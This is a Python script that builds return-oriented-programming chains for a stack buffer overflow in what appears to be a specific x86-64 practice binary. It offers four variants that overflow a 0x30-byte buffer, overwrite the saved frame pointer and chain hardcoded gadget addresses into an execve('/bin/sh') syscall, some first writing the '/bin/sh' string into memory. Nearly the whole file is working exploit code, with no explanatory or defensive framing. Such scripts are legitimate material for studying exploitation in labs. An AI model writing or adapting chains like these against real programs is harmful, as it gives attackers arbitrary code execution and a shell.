#!/usr/bin/env python3
import os
import struct
import sys


# gadgets

rg__mov_mrdx_rax__pop_rbp = 0x00000000004011c7  # mov qword ptr [rdx], eax; nop; pop rbp; ret;
rg__mov_rdx_rdi__inc_rdi = 0x00000000004013c3  # mov rdx, rdi; inc rdi; ret;
rg__pop_rdi = 0x0000000000401453  # pop rdi; ret;
rg__pop_rsi__pop_r15 = 0x0000000000401451  # pop rsi; pop r15; ret;
rg__mov_rax_rsi = 0x00000000004013e2  # mov rax, rsi; ret;
rg__syscall = 0x00000000004013b0  # syscall; ret;
rg__pop_rax = 0x000000000040121b  # pop rax; ret;


garbage = b'B' * 8

def p(x):
    return struct.pack('<Q', x)


def make_very_simple_chain():

    address_of_binsh = 0x402012
    address_of_nullptr = 0x404080

    rop_chain = b''

    rop_chain += b'A' * 0x30  # fill the buffer
    rop_chain += b'C' * 0x8  # overwrite saved rbp

    # load address of null pointer into rdx
    rop_chain += p(rg__pop_rdi)
    rop_chain += p(address_of_nullptr)
    rop_chain += p(rg__mov_rdx_rdi__inc_rdi)

    # load 0x3b into rax
    rop_chain += p(rg__pop_rax)
    rop_chain += p(0x3b)

    # load address of null pointer into rsi
    rop_chain += p(rg__pop_rsi__pop_r15)
    rop_chain += p(address_of_nullptr)
    rop_chain += garbage

    # load address of '/bin/sh' into rdi
    rop_chain += p(rg__pop_rdi)
    rop_chain += p(address_of_binsh)

    # syscall
    rop_chain += p(rg__syscall)

    return rop_chain


def make_simple_chain():

    address_of_binsh = 0x402012
    address_of_nullptr = 0x404080

    rop_chain = b''

    rop_chain += b'A' * 0x30  # fill the buffer
    rop_chain += b'C' * 0x8  # overwrite saved rbp

    # load address of null pointer into rdx
    rop_chain += p(rg__pop_rdi)
    rop_chain += p(address_of_nullptr)
    rop_chain += p(rg__mov_rdx_rdi__inc_rdi)

    # load 0x3b into rax
    rop_chain += p(rg__pop_rsi__pop_r15)
    rop_chain += p(0x3b)
    rop_chain += garbage
    rop_chain += p(rg__mov_rax_rsi)

    # load address of null pointer into rsi
    rop_chain += p(rg__pop_rsi__pop_r15)
    rop_chain += p(address_of_nullptr)
    rop_chain += garbage

    # load address of '/bin/sh' into rdi
    rop_chain += p(rg__pop_rdi)
    rop_chain += p(address_of_binsh)

    # syscall
    rop_chain += p(rg__syscall)

    return rop_chain


def make_slightly_less_complex_chain():

    address_of_buffer = 0x4040a0
    address_of_binsh = address_of_buffer
    address_of_nullptr = 0x404080

    def write_quadword(address, quadword):
        return b''.join([
            p(rg__pop_rdi),
            p(address),
            p(rg__mov_rdx_rdi__inc_rdi),
            p(rg__pop_rsi__pop_r15),
            quadword,
            garbage,
            p(rg__mov_rax_rsi),
            p(rg__mov_mrdx_rax__pop_rbp),
            garbage,
        ])

    rop_chain = b''

    rop_chain += b'A' * 0x30  # fill the buffer
    rop_chain += b'C' * 0x8  # overwrite saved rbp

    # write '/bin/sh\0' into the buffer
    rop_chain += write_quadword(address_of_binsh, b'/bin/sh\0')

    # load address of null pointer into rdx
    rop_chain += p(rg__pop_rdi)
    rop_chain += p(address_of_nullptr)
    rop_chain += p(rg__mov_rdx_rdi__inc_rdi)

    # load 0x3b into rax
    rop_chain += p(rg__pop_rsi__pop_r15)
    rop_chain += p(0x3b)
    rop_chain += garbage
    rop_chain += p(rg__mov_rax_rsi)

    # load address of null pointer into rsi
    rop_chain += p(rg__pop_rsi__pop_r15)
    rop_chain += p(address_of_nullptr)
    rop_chain += garbage

    # load address of '/bin/sh' into rdi
    rop_chain += p(rg__pop_rdi)
    rop_chain += p(address_of_binsh)

    # syscall
    rop_chain += p(rg__syscall)

    return rop_chain


def make_complex_chain():

    address_of_buffer = 0x4040a0
    address_of_binsh = address_of_buffer
    address_of_nullptr = address_of_buffer + 8

    def write_quadword(address, quadword):
        return b''.join([
            p(rg__pop_rdi),
            p(address),
            p(rg__mov_rdx_rdi__inc_rdi),
            p(rg__pop_rsi__pop_r15),
            quadword,
            garbage,
            p(rg__mov_rax_rsi),
            p(rg__mov_mrdx_rax__pop_rbp),
            garbage,
        ])

    rop_chain = b''

    rop_chain += b'A' * 0x30  # fill the buffer
    rop_chain += b'C' * 0x8  # overwrite saved rbp

    # write '/bin/sh\0' into the buffer
    rop_chain += write_quadword(address_of_binsh, b'/bin/sh\0')

    # write null pointer into the buffer
    rop_chain += write_quadword(address_of_nullptr, b'\x00' * 8)

    # load address of null pointer into rdx
    rop_chain += p(rg__pop_rdi)
    rop_chain += p(address_of_nullptr)
    rop_chain += p(rg__mov_rdx_rdi__inc_rdi)

    # load 0x3b into rax
    rop_chain += p(rg__pop_rsi__pop_r15)
    rop_chain += p(0x3b)
    rop_chain += garbage
    rop_chain += p(rg__mov_rax_rsi)

    # load address of null pointer into rsi
    rop_chain += p(rg__pop_rsi__pop_r15)
    rop_chain += p(address_of_nullptr)
    rop_chain += garbage

    # load address of '/bin/sh' into rdi
    rop_chain += p(rg__pop_rdi)
    rop_chain += p(address_of_binsh)

    # syscall
    rop_chain += p(rg__syscall)

    return rop_chain


modes = {'simple': make_simple_chain, 'complex': make_complex_chain, 'trivial': make_very_simple_chain, 'slightly_less_complex': make_slightly_less_complex_chain}
mk_chain = modes.get(sys.argv[1], make_simple_chain) if len(sys.argv) > 1 else make_simple_chain
rop_chain = mk_chain()
print(f'{len(rop_chain)=}', file=sys.stderr)

os.write(1, rop_chain)
